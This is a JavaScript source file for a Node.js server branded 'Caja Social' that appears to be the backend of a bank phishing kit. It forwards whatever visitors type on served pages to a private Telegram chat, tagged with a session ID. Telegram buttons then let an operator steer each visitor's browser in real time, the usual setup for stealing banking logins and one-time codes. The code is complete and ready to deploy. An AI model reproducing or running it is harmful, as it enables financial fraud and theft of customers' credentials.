/**
 * Caja Social — servidor standalone (solo banca + Telegram)
 * Despliegue: Render, Docker o node server.js
 */
'use strict';

const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

const PORT = process.env.PORT || 3000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '';

if (!TELEGRAM_TOKEN || !CHAT_ID) {
    console.warn('⚠️ Configura TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID en Render → Environment');
}

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] },
    pingTimeout: 60000,
    pingInterval: 25000,
    transports: ['websocket', 'polling']
});

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const sessions = new Map();

app.use(express.json());
app.use(express.static(__dirname));

app.get('/health', (req, res) => {
    res.json({ ok: true, service: 'caja-social-telegram', sessions: sessions.size });
});

function getOrCreateSession(sessionId, socketId) {
    let session = sessions.get(sessionId);
    if (!session) {
        session = { sessionId, socketId, data: {}, lastActivity: Date.now() };
        sessions.set(sessionId, session);
    } else {
        session.socketId = socketId;
        session.lastActivity = Date.now();
    }
    return session;
}

function deliverToSession(sessionId, event, payload) {
    io.to(sessionId).emit(event, payload);
}

async function handleCallbackQuery(callbackQuery) {
    const data = callbackQuery?.data;
    const callbackId = callbackQuery?.id;
    const chatId = callbackQuery?.message?.chat?.id;
    const messageId = callbackQuery?.message?.message_id;

    if (!data || !callbackId) return;

    let action = null;
    let sessionId = null;

    if (data.includes(':')) {
        const parts = data.split(':');
        action = parts[0];
        sessionId = parts.slice(1).join(':');
    } else {
        await bot.answerCallbackQuery(callbackId, { text: 'Formato inválido', show_alert: true });
        return;
    }

    const session = sessions.get(sessionId);
    if (session) session.lastActivity = Date.now();

    await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});

    deliverToSession(sessionId, 'telegramAction', {
        action,
        sessionId,
        fromTelegram: true,
        timestamp: Date.now()
    });

    await bot.answerCallbackQuery(callbackId, { text: `✅ ${action}` });
}

bot.on('callback_query', (q) => {
    handleCallbackQuery(q).catch((err) => console.error('callback_query:', err.message));
});

io.on('connection', (socket) => {
    console.log('🔌 Cliente:', socket.id);

    socket.on('init_session', (payload) => {
        const sessionId = payload?.sessionId;
        if (!sessionId) return;
        getOrCreateSession(sessionId, socket.id);
        socket.join(sessionId);
        socket.data.sessionId = sessionId;
        socket.emit('session_ready', { sessionId, socketId: socket.id });
        console.log('✅ Sesión:', sessionId);
    });

    socket.on('keepAlive', (payload) => {
        const session = sessions.get(payload?.sessionId);
        if (session) session.lastActivity = Date.now();
    });

    socket.on('sendData', async (data) => {
        try {
            const sessionId = data?.sessionId || socket.data?.sessionId;
            if (!sessionId) {
                socket.emit('dataSent', { success: false, error: 'Sin sessionId' });
                return;
            }

            getOrCreateSession(sessionId, socket.id);
            socket.join(sessionId);

            const text = data?.content?.text || '';
            const keyboard = data?.content?.keyboard || null;
            const fullMessage = `${text}\n\n🆔 <code>${sessionId}</code>`;

            const sent = await bot.sendMessage(CHAT_ID, fullMessage, {
                parse_mode: 'HTML',
                reply_markup: keyboard
            });

            socket.emit('dataSent', { success: true, sessionId, messageId: sent.message_id });
            console.log('📨 Telegram OK:', data?.type, sessionId);
        } catch (err) {
            console.error('❌ sendData:', err.message);
            socket.emit('dataSent', { success: false, error: err.message });
        }
    });

    socket.on('disconnect', () => {
        console.log('❌ Desconectado:', socket.id);
    });
});

setInterval(() => {
    const now = Date.now();
    for (const [id, s] of sessions.entries()) {
        if (now - s.lastActivity > 30 * 60 * 1000) sessions.delete(id);
    }
}, 600000);

server.listen(PORT, () => {
    console.log(`🚀 Caja Social en http://localhost:${PORT}`);
    console.log(`🤖 Telegram: ${TELEGRAM_TOKEN ? 'OK (polling)' : 'NO CONFIGURADO'}`);
});
